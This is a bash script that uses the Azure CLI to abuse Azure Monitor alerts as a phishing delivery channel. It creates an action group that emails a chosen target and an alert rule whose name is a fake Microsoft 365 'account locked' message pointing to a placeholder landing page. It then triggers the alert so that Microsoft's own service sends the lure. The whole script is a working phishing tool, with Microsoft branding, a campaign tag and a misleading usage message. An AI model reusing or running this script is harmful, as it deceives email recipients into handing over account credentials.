usage() {
  echo "cleaning up old runs"
  echo "Usage: $0 --e <email> "
  exit 1
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --e) TARGET_EMAIL="$2"; shift 2 ;;
    *) usage ;;
  esac
done

[[ -z "$TARGET_EMAIL" ]] && usage

main() {
  SUBSCRIPTION_ID=$(az account show --query id -o tsv)
  RG_NAME="MS365"
  LANDING_URL="${LANDING_URL:-your-landing-page.web.app}"
  ALERT_RULE_NAME="$TARGET_EMAIL your 365 account has been locked new account signin for activation history go to $LANDING_URL critical security alert " ## content of message 
  ACTION_GROUP_NAME="Microsoft365"
  LOCATION="eastus"

  # Step 0: Delete and recreate the resource group fresh
  az group delete --name "$RG_NAME" --yes 2>/dev/null || true
  until [[ "$(az group exists --name "$RG_NAME")" == "false" ]]; do
    sleep 3
  done

  # Step 1: Create disposable resource group
  az group create --name "$RG_NAME" --location "$LOCATION"

  # Step 2: Create action group with email
  az monitor action-group create \
    --resource-group "$RG_NAME" \
    --name "$ACTION_GROUP_NAME" \
    --short-name "365" \
    --action email target "$TARGET_EMAIL"

  # Step 3: Create activity log alert
  ACTION_GROUP_ID="/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RG_NAME/providers/Microsoft.Insights/actionGroups/$ACTION_GROUP_NAME"

  az monitor activity-log alert create \
    --resource-group "$RG_NAME" \
    --name "$ALERT_RULE_NAME" \
    --condition "category=Administrative and operationName=Microsoft.Resources/tags/write and status=Succeeded" \
    --action-group "$ACTION_GROUP_ID" \
    --scope "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RG_NAME"

  # Activity Log Alerts take ~60-90s after creation before they start evaluating
  # the event stream. Wait before firing the trigger event or it'll sail past.
  echo "Waiting 90s for alert rule to warm up..."
  sleep 90

  # Step 4: Trigger the alert
  az tag update \
    --resource-id "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RG_NAME" \
    --operation merge \
    --tags campaign=001

  echo "Alert triggered. Waiting 5 min before exit so Azure can process..."
  sleep 300
  az group delete --name "$RG_NAME" --yes --no-wait
}

main
